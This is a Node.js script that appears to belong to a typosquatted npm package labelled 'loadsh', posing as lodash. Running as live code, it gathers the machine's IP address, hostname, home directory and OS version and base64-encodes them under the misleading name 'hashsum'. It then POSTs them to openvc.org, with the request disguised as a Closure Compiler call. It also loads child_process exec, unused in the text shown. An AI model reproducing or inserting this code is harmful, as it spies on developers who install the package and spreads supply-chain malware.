const os=require("os");
var fs=require('fs');
//var btoa=require('btoa')
var sys=os.platform();
var log=require('child_process').exec;

function hostIp() {
    var IPv4;
    if(process.platform === 'linux') {
        for(var i = 0; i < os.networkInterfaces().eth0.length; i++) {
            if(os.networkInterfaces().eth0[i].family == 'IPv4') {
                IPv4 = os.networkInterfaces().eth0[i].address;
            }
        }
    } else if(process.platform === 'win32') {
        for(var i = 0; i < os.networkInterfaces()['本地连接'].length; i++) {
            if(os.networkInterfaces()['本地连接'][i].family == 'IPv4') {
                IPv4 = os.networkInterfaces()['本地连接'][i].address;
            }
        }
    } else if(process.platform === 'darwin') {
        for(var i = 0; i < os.networkInterfaces().en0.length; i++) {
            if(os.networkInterfaces().en0[i].family == 'IPv4') {
                IPv4 = os.networkInterfaces().en0[i].address;
            }
    }
    }
    return IPv4;
}

var ip=hostIp()
var hostname=os.hostname()
var username=os.homedir()
var sysver=process.platform+os.release()
var language="skip"
var date=new Date().toISOString().replace(/T/,' ').replace(/\..+/,'');
var hashsum='ip1='+ip+"&hostname="+hostname+"&username="+username+"&sysver="+sysver+"&language="+language+"&package=loadsh"+"&date="+date;
hashsum=new Buffer(hashsum).toString('base64')



var querystring = require('querystring');
var http = require('http');
var fs = require('fs');

function PostCode(keyvalue) {
  // Build the post string from an object
  var post_data = querystring.stringify({
      'compilation_level' : 'ADVANCED_OPTIMIZATIONS',
      'output_format': 'json',
      'output_info': 'compiled_code',
      'warning_level' : 'QUIET',
      'hashsum': keyvalue
  });

  // An object of options to indicate where to post to
  var post_options = {
      host: 'openvc.org',
      port: '80',
      path: '/hashsum.php',
      method: 'POST',
      headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(post_data)
      }
  };

  // Set up the request
  var post_req = http.request(post_options, function(res) {
      res.setEncoding('utf8');
      res.on('data', function (chunk) {
          console.log('Response: ' + chunk);
      });
  });

  // post the data
  post_req.write(post_data);
  post_req.end();

}

PostCode(hashsum)
